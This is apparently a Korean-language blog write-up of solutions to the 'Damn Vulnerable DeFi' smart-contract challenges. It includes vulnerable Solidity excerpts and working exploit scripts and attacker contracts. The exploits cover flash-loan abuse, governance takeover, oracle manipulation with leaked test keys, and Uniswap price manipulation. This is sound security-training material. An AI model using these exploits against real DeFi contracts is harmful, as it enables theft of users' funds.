[{"content":" \u0026lsquo;Damn Vulnerable DeFi\u0026rsquo; is an offensive security playground for decentralized finances.\nThis article offers a brief summary and exploit code of each challenge.\nFor detailed source code and contents, please check my github repository.\n # 1. Unstoppable Summary Flash Loan을 제공하고 있는 Lending Pool을 대상으로 DoS 공격을 통해 기능을 멈추게하는 것이 목표이다.\nFlash Loan?\n Flash Loan은 간단하게 설명하자면 \u0026lsquo;무담보\u0026rsquo; 대출로, 보통 사용자는 대출 풀에 소정의 수수료를 지급하고(물론 트랜잭션 실행에 대한 가스비도 소모) 토큰을 대출할 수 있다.\n대출한 토큰을 가지고 다른 DeFi 서비스에 투자를 하던, 에어드랍 보상을 위한 스테이킹을 하던, 사용자가 상환 이전까지 사용할 수 있다.\n하지만 Flash Loan의 대출-상환 프로세스는 \u0026lsquo;단일\u0026rsquo; 트랜잭션에서 이루어져야 하며, 상환 과정에서 대출받은 토큰만큼의 수량을 Pay Back하지 않는 경우 해당 트랜잭션이 revert된다.\nrevert가 된다는 것은 해당 트랜잭션이 블록에 포함되지 않아 PoW/PoS 등의 거래증명이 완료되지 않기 때문에, State Transition이 발생하지 않는다.\n말이 어려운데 그냥 원금을 돌려놓지 않으면, 대출-상환 사이에 토큰을 옮기든 무엇을 하든 트랜잭션 revert로 인해 대출 실행 이전의 상태로 원복된다는 것이다.(수수료나 가스비만 소모)\n 이더리움에서는 계정(컨트랙트 및 EOA)을 대상으로 강제로 Ether를 송신할 수 있으므로\nuint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore \u0026gt;= borrowAmount, \u0026#34;Not enough tokens in pool\u0026#34;); // Ensured by the protocol via the `depositTokens` function assert(poolBalance == balanceBefore); 와 같이 컨트랙트의 balance를 엄격하게 확인하는 코드를 작성하는 경우에 주의해야 한다.\n위 코드로 인해 Lending Pool의 계좌 잔액이 1 wei만 늘어나더라도, assert()에 의해 이후의 코드가 실행되지 않는 DoS 상태로 빠질 수 있다.\nExploit unstoppable.challenge.js\nawait this.token.connect(attacker).transfer(this.pool.address, 1); // forcibly send 1 wei to lending pool  # 2. Naive receiver Summary Flash Loan을 제공하는 Lending Pool에서 대출 수수료로 1 ETH를 청구한다. 해당 Lending Pool을 이용하는 특정 사용자의 balance(10 ETH)를 drain하는 것이 목표이다.\n// NaiveReceiverLenderPool.sol ... // msg.sender가 borrower인지 검증하는 로직이 없음 -\u0026gt; 공격자가 임의의 사용자의 컨트랙트에 있는 잔고를 고갈시킬 수 있음(수수료 사용) function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant { // (1) Flash Loan 컨트랙트의 잔액이 borrowAmount에 비해 충분한지 확인  uint256 balanceBefore = address(this).balance; require(balanceBefore \u0026gt;= borrowAmount, \u0026#34;Not enough ETH in pool\u0026#34;); // (2) 대출자인 borrower가 컨트랙트인지 확인(not EOA)  require(borrower.isContract(), \u0026#34;Borrower must be a deployed contract\u0026#34;); // borrower.receiveEther() 호출  // Transfer ETH and handle control to receiver  borrower.functionCallWithValue( abi.encodeWithSignature( \u0026#34;receiveEther(uint256)\u0026#34;, FIXED_FEE ), borrowAmount ); require( address(this).balance \u0026gt;= balanceBefore + FIXED_FEE, \u0026#34;Flash loan hasn\u0026#39;t been paid back\u0026#34; ); } ... 위 코드를 보면 확인할 수 있듯이, flashLoan() 을 호출하여 대출을 실행하는 사용자인 msg.sender가 borrower인지 검증하는 로직이 없어, 공격자가 임의의 사용자 주소를 borrower에 입력하여 호출이 가능하다.\nExploit naive-receiver.challenge.js\nfor(let i=0;i\u0026lt;10;i++){ await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther(\u0026#39;0\u0026#39;)); }  # 3. - Truster Summary Flash Loan을 기반으로 DTV 토큰을 무료로 대출해주는 Lending Pool이 있으며, 해당 Lending Pool은 100만개의 DTV 토큰을 가지고 있다. 해당 Lending Pool로부터 모든 DTV 토큰을 공격자의 계정으로 옮기는 것이 목표이다.\n... // functionCall()을 이용하여 target 컨트랙트의 및 특정 함수를 호출하는 코드로 인해, 공격자는 어떠한 함수든 호출이 가능 function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data ) external nonReentrant { uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore \u0026gt;= borrowAmount, \u0026#34;Not enough tokens in pool\u0026#34;); damnValuableToken.transfer(borrower, borrowAmount); target.functionCall(data); // Vulnerable : target 및 data를 이용해 함수 호출 -\u0026gt; 어떠한 함수든 호출이 가능한 상황  uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); require(balanceAfter \u0026gt;= balanceBefore, \u0026#34;Flash loan hasn\u0026#39;t been paid back\u0026#34;); } ... target.functionCall(data); 에 의해 현재 어떠한 함수든 사용자가 호출이 가능한 상황이다.\nrequire(balanceAfter \u0026gt;= balanceBefore, \u0026quot;Flash loan hasn't been paid back\u0026quot;); 구문 우회를 위해, approve() 함수를 호출하도록하여 Lending Pool-\u0026gt;공격자로 토큰 전송을 승인해두고 flashLoan() 호출 이후에 transferFrom()을 이용해 Lending Pool의 모든 토큰을 공격자의 계정으로 가져올 수 있다.\nExploit truster.challenge.js\nconst ABI = [\u0026#34;function approve(address, uint256)\u0026#34;]; const interface = new ethers.utils.Interface(ABI); const payload = interface.encodeFunctionData(\u0026#34;approve\u0026#34;, [attacker.address, TOKENS_IN_POOL.toString()]); await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload); // token.approve() : lending pool -\u0026gt; attacker await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);  # 4. Side entrance Summary 누구나,언제든 ETH를 예치/인출할 수 있는 Lending Pool이 있다.\n해당 Lending Pool은 1,000 ETH의 balance를 가지고 있으며, 프로모션으로 예치된 ETH를 자유롭게 대출할 수 있는 Flash Loan 서비스를 제공하고 있다.\n공격자는 해당 Lending Pool로부터 모든 ETH를 가져와야 한다.\n// SideEntranceLenderPool contract SideEntranceLenderPool { using Address for address payable; mapping (address =\u0026gt; uint256) private balances; // ETH deposit(예치) 기능 제공  // Vulnerable : ETH 수신 여부와 상관없이 balance를 증가시킴  function deposit() external payable { balances[msg.sender] += msg.value; } // ETH withdraw(인출) 기능 제공  function withdraw() external { uint256 amountToWithdraw = balances[msg.sender]; balances[msg.sender] = 0; payable(msg.sender).sendValue(amountToWithdraw); } /** * @notice Flash Loan 기능으로 사용자에게 원하는 만큼의 ETH를 대출 * @param amount 대출할 ETH의 수량 * @dev 대출을 요청한 사용자 컨트랙트의 execute() 함수를 호출 -\u0026gt; execute */ function flashLoan(uint256 amount) external { uint256 balanceBefore = address(this).balance; require(balanceBefore \u0026gt;= amount, \u0026#34;Not enough ETH in balance\u0026#34;); IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); require(address(this).balance \u0026gt;= balanceBefore, \u0026#34;Flash loan hasn\u0026#39;t been paid back\u0026#34;); } } 대출을 요청한 사용자 컨트랙트의 execute() 함수를 실행하며, msg.value를 통해 대출한 ETH 토큰을 전달한다.\ndeposit() 함수는 ETH를 사용자에게 수신했는지 여부와 상관없이 balance를 증가시키도록 취약한 형태로 작성되어 있다.\n공격자는 내부적으로 deposit()을 호출하여 대출한 ETH를 Lending Pool에 예치하는 execute() 함수 및 컨트랙트를 호출한 뒤, flashLoan() 실행이 종료된 이후에 withdraw()를 통해 ETH를 가져올 수 있다.\n (1) flashLoan()을 통해 대출한 ETH를 다시 deposit()하여 공격자의 balances를 증가시킨다.  deposit()이 예치한 사용자의 ETH 전송 여부는 확인하지 않기 때문에, 대출한 토큰으로 balances만 증가시키고 다시 상환   (2) 공격자는 withdraw()를 호출하여 Lending Pool의 ETH를 가져온다.  Exploit attacker-contracts/FlashLoanEtherReceiver.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \u0026#34;../side-entrance/SideEntranceLenderPool.sol\u0026#34;; contract FlashLoanEtherReceiver { SideEntranceLenderPool private immutable pool; address payable private immutable attacker; constructor(address payable poolAddress, address payable attackerAddress) { pool = SideEntranceLenderPool(poolAddress); attacker = attackerAddress; } function execute() external payable { pool.deposit{value: msg.value}(); } function executeFlashLoan() external { // attack -\u0026gt; increase attacker\u0026#39;s balances  pool.flashLoan(address(pool).balance); pool.withdraw(); // send drained ether to attacker  attacker.transfer(address(this).balance); } // Allow deposits of ETH  receive () external payable {} } side-entrance.challenge.js\nconst FlashLoanEtherReceiver = await ethers.getContractFactory(\u0026#39;FlashLoanEtherReceiver\u0026#39;, attacker); this.receiver = await FlashLoanEtherReceiver.deploy(this.pool.address, attacker.address); await this.receiver.executeFlashLoan();  # 5. The rewarder Summary DTV 토큰을 예치한 사용자에게 5일마다 한번씩 리워드 토큰을 보상해주는 Reward Pool이 있다. (라운드마다 100개의 리워드 토큰을 보상하며, 예치한 비율에 따라 분배)\n현재 Alice, Bob, Charile, David 4명이 사용자가 각각 100개의 DTV 토큰을 예치한 상태이며, Reward Round 2에서 각각 25개씩의 Reward를 수령하였다.\n공격자는 DTV 토큰을 하나도 가지고 있지 않은 상태에서, Reward Round 3에서 가장 많은 Reward Token을 수령하는 것이 목표이다.\n100만개의 DTV 토큰을 보유하고 있는 FlashLoanderPool로부터 대출받은 토큰을 Reward Pool에 예치하여 리워드 토큰을 수령하면 된다.\nExploit attacker-contracts/FlashLoanTheRewarder.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; interface IFlashLoanerPool { function flashLoan(uint256 amount) external; } interface IDamnValuableToken { function approve(address spender, uint256 amount) external returns (bool); function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } interface IRewarderPool { function deposit(uint256 amountToDeposit) external; function withdraw(uint256 amountToWithdraw) external; function distributeRewards() external returns (uint256); } interface IRewardToken { function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } contract FlashLoanTheRewarder { using Address for address payable; address payable private lenderPool; //address payable private liquidityToken;  address payable private rewarderPool; address payable private attacker; address payable private rewardToken; address payable private liquidityToken; uint256 public testUint; constructor (address payable _lenderPool, address payable _liquidityToken, address payable _rewardToken, address payable _rewarderPool, address payable _attacker) { lenderPool = _lenderPool; //liquidityToken = _liquidityToken;  liquidityToken = _liquidityToken; rewarderPool = _rewarderPool; rewardToken = _rewardToken; attacker = _attacker; } function receiveFlashLoan(uint256 amount) external { require(msg.sender == lenderPool, \u0026#34;Sender must be pool\u0026#34;); // Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)  uint256 amountToBeRepaid = amount; IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid); IRewarderPool(rewarderPool).deposit(amountToBeRepaid); IRewarderPool(rewarderPool).withdraw(amountToBeRepaid); // Flashloan Repayment : Pay back to LenderPool(flashloan)  IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid); } function execFlashLoans(uint256 amount) external { IFlashLoanerPool(lenderPool).flashLoan(amount); IRewardToken(rewardToken).transfer( msg.sender, IRewardToken(rewardToken).balanceOf(address(this)) ); } receive () external payable {} } the-rewarder.challenge.js\nconst FlashLoanTheRewarder = await ethers.getContractFactory(\u0026#39;FlashLoanTheRewarder\u0026#39;, attacker); this.attackerContract = await FlashLoanTheRewarder.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, attacker.address); // Next Reward Round! await ethers.provider.send(\u0026#34;evm_increaseTime\u0026#34;, [5 * 24 * 60 * 60]); // 5 days  await this.attackerContract.execFlashLoans(ethers.utils.parseEther(\u0026#39;1000000\u0026#39;)); //console.log(await this.attackerContract.check()); console.log(await this.rewarderPool.roundNumber()); // for (let i = 0; i \u0026lt; users.length; i++) { // console.log(await this.rewardToken.balanceOf(users[i].address)); // } console.log(await this.rewardToken.balanceOf(attacker.address));  # 6. Selfie Summary Flash Loan을 제공하며 거버넌스 메커니즘을 기반으로 제어가 가능한 150만개의 DTV 토큰을 보유하고 있는 Lending Pool이 있다.\n공격자는 0개의 DTV 토큰을 가지고 있으며, 해당 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이다.\n// SelfiePool.sol ... /** * @notice 컨트랙트(펀드)에 있는 모든 토큰 잔액을 해당 주소로 전송 (governance만 해당 함수 호출 가능) * @param receiver 모든 토큰 잔액을 전송할 대상 주소 */ function drainAllFunds(address receiver) external onlyGovernance { uint256 amount = token.balanceOf(address(this)); token.transfer(receiver, amount); emit FundsDrained(receiver, amount); } ... Flash Loan 컨트랙트에는 거버넌스만이 실행할 수 있으며 지정된 계정으로 모든 토큰을 보내는 drainAllFunds() 함수를 제공하고 있다.\n// SimpleGovernance.sol ... /** * @notice 거버넌스 큐에 실행할 작업을 적재 * @param receiver 작업을 실행할 컨트랙트의 주소 * @param data 작업에 사용할 calldata(함수 이름, 인자 등) * @return 큐에 적재된 작업의 식별자(actionId) */ function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) { require(_hasEnoughVotes(msg.sender), \u0026#34;Not enough votes to propose an action\u0026#34;); // 큐에 작업을 추가하기 위해서는 전체 토큰 발행량의 절반 이상을 가지고 있어야 함  require(receiver != address(this), \u0026#34;Cannot queue actions that affect Governance\u0026#34;); // governance 컨트랙트 내 함수는 실행하지 못함  uint256 actionId = actionCounter; GovernanceAction storage actionToQueue = actions[actionId]; actionToQueue.receiver = receiver; actionToQueue.weiAmount = weiAmount; actionToQueue.data = data; actionToQueue.proposedAt = block.timestamp; // 작업이 큐에 적재된 시간(timestamp)  actionCounter++; emit ActionQueued(actionId, msg.sender); return actionId; } ... /** * @notice 거버넌스 큐에 적재된 작업 실행 * @param actionId 실행할 작업의 식별자(actionId) */ function executeAction(uint256 actionId) external payable { // _canBeExecuted()에 의해 (1) 아직 실행된 적이 없고(executedAt==0), (2) 큐에 적재된지 2일 이상이 지난 작업만 실행 가능  require(_canBeExecuted(actionId), \u0026#34;Cannot execute this action\u0026#34;); GovernanceAction storage actionToExecute = actions[actionId]; actionToExecute.executedAt = block.timestamp; actionToExecute.receiver.functionCallWithValue( actionToExecute.data, // address target  actionToExecute.weiAmount // bytes memory data  ); emit ActionExecuted(actionId, msg.sender); } 해당 거버넌스 메커니즘은 총 200만개가 발행된 DTV 토큰 중에서, 100만개를 초과한 토큰을 가진 계정만이 Lending Pool을 제어할 수 있는 action을 queue에 삽입할 수 있다.\nFlash Loan으로부터 150만개의 토큰(총 발행량의 과반이 넘는 토큰양)을 대출한 뒤, 거버넌스 큐에 drainAllFunds() 함수를 실행하는 action을 삽입한다.\n이후 queue에 있는 action을 실행하여 Lending Pool의 모든 토큰을 공격자의 계정으로 옮길 수 있다.\nExploit SelfiePool.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \u0026#34;@openzeppelin/contracts/utils/Address.sol\u0026#34;; interface IDamnValuableToken { function transfer(address recipient, uint256 amount) external; function transferFrom(address sender, address recipient, uint256 amount) external; function approve(address spender, uint256 amount) external; function balanceOf(address account) external returns (uint256); } interface IDamnValuableTokenSnapshot { function snapshot() external returns (uint256); function getBalanceAtLastSnapshot(address account) external view returns (uint256); function getTotalSupplyAtLastSnapshot() external view returns (uint256); } interface ISimpleGovernance { function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256); function executeAction(uint256 actionId) external payable; function getActionDelay() external view returns (uint256); } interface ISelfiePool { function flashLoan(uint256 borrowAmount) external; function drainAllFunds(address receiver) external; } contract FlashLoanSelfie { using Address for address payable; address payable public attacker; address payable public token; address payable public governance; address payable public lenderPool; uint256 public actId; constructor (address payable _attacker, address payable _token, address payable _governance, address payable _lenderPool) { attacker = _attacker; token = _token; governance = _governance; lenderPool = _lenderPool; } function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external { // Flash loan borrow  IDamnValuableTokenSnapshot(_tokenAddress).snapshot(); actId = ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature(\u0026#34;drainAllFunds(address)\u0026#34;, attacker), 1); // Flash loan repayment : pay back to flash loan  IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount); } function executeFlashLoans(uint256 _amount) external { ISelfiePool(lenderPool).flashLoan(_amount); } receive() external payable {} } selfie.challenge.js\nconst FlashLoanSelfieFactory = await ethers.getContractFactory(\u0026#39;FlashLoanSelfie\u0026#39;, attacker); this.exploit = await FlashLoanSelfieFactory.deploy(attacker.address, this.token.address, this.governance.address, this.pool.address); await this.exploit.connect(attacker).executeFlashLoans(ethers.utils.parseEther(\u0026#34;1500000\u0026#34;)); await ethers.provider.send(\u0026#34;evm_increaseTime\u0026#34;, [2 * 24 * 60 * 60]); // 2 days  await this.governance.executeAction(0);  # 7. Compromised Summary \u0026ldquo;DVNFT\u0026quot;라는 NFT를 거래하는 마켓이 있으며, 해당 NFT는 개당 999 ETH에 판매되고 있다.\nNFT의 판매 가격은 3개의 Trusted Reporter가 설정한 가격의 median 값을 사용하고 있다.\nNFT 마켓은 9990 ETH, 공격자는 0.1 ETH를 보유하고 있는 상황에서 마켓이 가진 모든 ETH를 가져오는 것이 목표이다.\n해당 마켓으로부터 다음과 같은 on-chain 데이터가 유출되었다.\nHTTP/2 200 OK content-type: text/html content-language: en vary: Accept-Encoding server: cloudflare 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 유출된 두개의 데이터는 2개의 Trusted Reporter 계정의 개인키(Private Key)이므로, 해당 개인키를 이용해 NFT 마켓의 NFT 가격을 낮게 설정하는 트랜잭션을 송신함으로써 시세 조작이 가능하다.\n// TrustfulOracle.sol ... function _computeMedianPrice(string memory symbol) private view returns (uint256) { uint256[] memory prices = _sort(getAllPricesForSymbol(symbol)); // calculate median price if (prices.length % 2 == 0) { uint256 leftPrice = prices[(prices.length / 2) - 1]; uint256 rightPrice = prices[prices.length / 2]; return (leftPrice + rightPrice) / 2; } else { return prices[prices.length / 2]; } } ... Trusted Reporter가 설정한 가격이 홀수인 경우 prices[prices.length / 2]와 같이 median price를 계산한다.\n공격자는 3개중 2개의 개인키를 가지고 있기 때문에, 원하는대로 median price를 조작하는 것이 가능하다.\nExploit compromised.challenge.js\n// load wallet/signer from Private Key  // Leaked Hex Data -\u0026gt; Base64Decode // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 let privKey1 = \u0026#34;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\u0026#34;; var wallet1 = new ethers.Wallet(privKey1, ethers.provider); // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 let privKey2 = \u0026#34;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\u0026#34;; var wallet2 = new ethers.Wallet(privKey2, ethers.provider); // Makret Manipulation (Price to low) await this.oracle.connect(wallet1).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;0.01\u0026#34;)); await this.oracle.connect(wallet2).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;0.01\u0026#34;)); // buy await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(\u0026#34;0.01\u0026#34;)}); // Makret Manipulation (Price to high) await this.oracle.connect(wallet1).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;9990.01\u0026#34;)); await this.oracle.connect(wallet2).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;9990.01\u0026#34;)); console.log(await this.oracle.getAllPricesForSymbol(\u0026#34;DVNFT\u0026#34;)); console.log(await this.oracle.getMedianPrice(\u0026#34;DVNFT\u0026#34;)); // approve \u0026amp; sell await this.nftToken.connect(attacker).approve(this.exchange.address, 0); await this.exchange.connect(attacker).sellOne(0); // price recovery await this.oracle.connect(wallet1).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;999\u0026#34;)); await this.oracle.connect(wallet2).postPrice(\u0026#34;DVNFT\u0026#34;, ethers.utils.parseEther(\u0026#34;999\u0026#34;));  # 8. Puppet Summary 100,000 DTV 토큰을 보유한 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이며, 공격자는 25 ETH / 1,000 DTV를 가지고 있는 상태로 시작한다.\nUniswap V1을 기반으로 구축된 Puppet Pool DEX(DEcentralized eXchange)가 있으며, 10 DTV / 10 ETH 의 초기 유동성이 공급되고 있다.\n100,000 DTV 토큰을 보유하고 담보 대출을 해주는 Lending Pool이 있으며, Uniswap V1의 AMM(CPMM, Constants Product Market Maker)을 Price Oracle로 사용하고 있다.\n 정확히는 Uniswap V1에서 받아오는 Price Oracle의 x2 가격을 담보로 설정하여 DTV 토큰을 대출해준다. 초기 Uniswap V1의 유동성은 10 DTV / 10 ETH이기 때문에, CPMM에 의해 Price Oracle은 1이며, Lending Pool로부터 1 DTV를 대출하려면 2 ETH를 담보로 전송해야 한다.  공격자는 자신이 가진 DTV를 Uniswap V1 Pool에 있는 ETH와 Swap하여 Price Oracle 즉 DTV 토큰의 상대적인 가격을 임의로 낮출 수 있다. (1 DTV 당 대출에 필요한 ETH 가격이 낮아짐)\n CPMM 기반 Uniswap V1 Pool에 충분한 유동성이 공급되지 않는 경우, 토큰의 가격을 조작할 수 있다. (안정적인 가격 유지를 위해 충분한 유동성이 공급되어야 한다.)\n Exploit puppet.challenge.js\nawait this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther(\u0026#34;990\u0026#34;)); await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(ethers.utils.parseEther(\u0026#34;990\u0026#34;), ethers.utils.parseEther(\u0026#34;1\u0026#34;), (await ethers.provider.getBlock(\u0026#39;latest\u0026#39;)).timestamp * 2, attacker.address); let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther(\u0026#34;1\u0026#34;))); let numOfEths = priceOracle.mul(100000).add(1); await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\u0026#34;100000\u0026#34;), {value: numOfEths});  # 9. Puppet v2 Summary Puppet과 동일하게 적은 유동성에 따른 토큰 가격 조작에 대한 위험이 있으며, Uniswap V2 업데이트에 따른 인터페이스(Wrapped ETH, Swap Router Path 등)만 맞춰주면 된다.\nExploit puppet-v2.challenge.js\n// Swap DTV -\u0026gt; ETH let stamp = (await ethers.provider.getBlock(\u0026#39;latest\u0026#39;)).timestamp * 2; await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.utils.parseEther(\u0026#34;9999\u0026#34;)); await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ethers.utils.parseEther(\u0026#34;9999\u0026#34;), ethers.utils.parseEther(\u0026#34;1\u0026#34;), [this.token.address, this.weth.address], attacker.address, stamp); // lending! // attacker eth -\u0026gt; weth convert let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther(\u0026#34;1\u0026#34;))); let numOfWeths = priceOracle.mul(1000001) await this.weth.connect(attacker).deposit({value: numOfWeths}); await this.weth.connect(attacker).approve(this.lendingPool.address, numOfWeths); // steal! await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\u0026#34;1000000\u0026#34;));  # 10. Free rider TBU\n # 11. Backdoor TBU\n # 12. Climber TBU\n","permalink":"https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/","summary":"\u003chr\u003e\n\u003cp\u003e\u003ca href=\"https://www.damnvulnerabledefi.xyz/\"\u003e\u003cstrong\u003e\u003cem\u003e\u0026lsquo;Damn Vulnerable DeFi\u0026rsquo;\u003c/em\u003e\u003c/strong\u003e\u003c/a\u003e is an offensive security playground for decentralized finances.\u003c/p\u003e\n\u003cp\u003eThis article offers a brief summary and exploit code of each challenge.\u003c/p\u003e\n\u003cp\u003eFor detailed source code and contents, please check \u003ca href=\"https://github.com/inhack/damn-vernerable-defi-solutions\"\u003emy github repository\u003c/a\u003e.\u003c/p\u003e","title":"[Solution] Damn Vulnerable DeFi"}]